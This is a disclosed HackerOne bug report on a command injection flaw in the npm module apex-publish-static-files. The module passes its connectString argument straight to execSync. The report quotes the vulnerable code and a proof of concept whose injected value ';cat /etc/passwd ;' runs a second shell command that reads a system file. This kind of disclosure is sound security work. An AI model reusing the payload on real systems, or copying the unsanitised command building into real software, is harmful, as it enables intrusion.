# [apex-publish-static-files] Command Injection on connectString

## Report Details
- **Report ID**: 405694
- **URL**: https://hackerone.com/reports/405694
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-09-05T01:49:30.554Z
- **Disclosed**: 2018-10-18T18:32:08.981Z

## Reporter
- **Username**: abdilahrf_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a command injection vulnerability in the apex-publish-static-files npm module.
It allows arbitrary shell command execution through a maliciously crafted argument.

# Module

**module name:** apex-publish-static-files
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/apex-publish-static-files`

## Module Description

>Uploads all files from a local directory to Oracle APEX

## Module Stats

15 downloads in the last day
~170 downloads in the last month

# Vulnerability

## Vulnerability Description

apex-publish-static-files does not sanitize the connectionString argument, and subsequently passes it to execSync(), thus allowing arbitrary shell command injection. 

Vulnerability Code : [https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66](https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66)

```
			const childProcess = execSync(
				'"' + opts.sqlclPath + '"' + // Sqlcl path
				' ' + opts.connectString + // Connect string (user/pass@server:port/sid)
				' @"' + path.resolve(__dirname, 'lib/script') + '"' + // Sql to execute
				' "' + path.resolve(__dirname, 'lib/distUpload.js') + '"' + // Param &1 (js to execute)
				' "' + path.resolve(opts.directory) + '"' + // Param &2
				' ' + opts.appID + // Param &3
				' "' + opts.destination + '"' + // Param &4
				' "' + opts.pluginName + '"' // Param &5
				, {
					encoding: 'utf8'
				}
			);
```


## Steps To Reproduce:

- npm i apex-publish-static-files
- create index.js file like this :

```
var publisher = require('apex-publish-static-files');
 
publisher.publish({
connectString: ";cat /etc/passwd ;",
    directory: "public",
    appID: 111
});
```
- execute `node index.js`

F342500

## Supporting Material/References:

OS: WSL Ubuntu 16.04
NODE: v10.8.0
NPM : 6.2.0


# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows arbitrary shell command execution through a maliciously crafted argument.

## Attachments
- apex_rce.png
